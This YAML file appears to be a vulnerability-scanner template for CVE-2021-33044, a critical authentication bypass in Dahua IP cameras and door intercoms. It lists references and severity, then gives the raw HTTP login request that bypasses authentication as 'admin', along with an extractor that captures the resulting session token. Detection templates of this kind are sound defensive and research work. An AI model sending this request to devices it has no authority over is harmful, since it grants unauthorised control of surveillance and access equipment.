id: CVE-2021-33044
info:
  author: gy741
  classification:
    cve-id: CVE-2021-33044
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
  description: The identity authentication bypass vulnerability found in some Dahua
    products during the login process. Attackers can bypass device identity authentication
    by constructing malicious data packets.
  name: Dahua IPC/VTH/VTO devices Authentication Bypass
  reference:
  - https://github.com/dorkerdevil/CVE-2021-33044
  - https://nvd.nist.gov/vuln/detail/CVE-2021-33044
  - https://seclists.org/fulldisclosure/2021/Oct/13
  - https://www.dahuasecurity.com/support/cybersecurity/details/957
  severity: critical
  tags: dahua,cve,cve2021,auth-bypass
requests:
- extractors:
  - group: 1
    part: body
    regex:
    - ',"result":true,"session":"([a-z]+)"\}'
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - '"result":true'
    - id
    - params
    - session
  matchers-condition: and
  raw:
  - 'POST /RPC2_Login HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    Connection: close

    X-Requested-With: XMLHttpRequest

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}


    {"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType":
    "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType":
    "Default", "userName": "admin"}, "session": 0}

    '
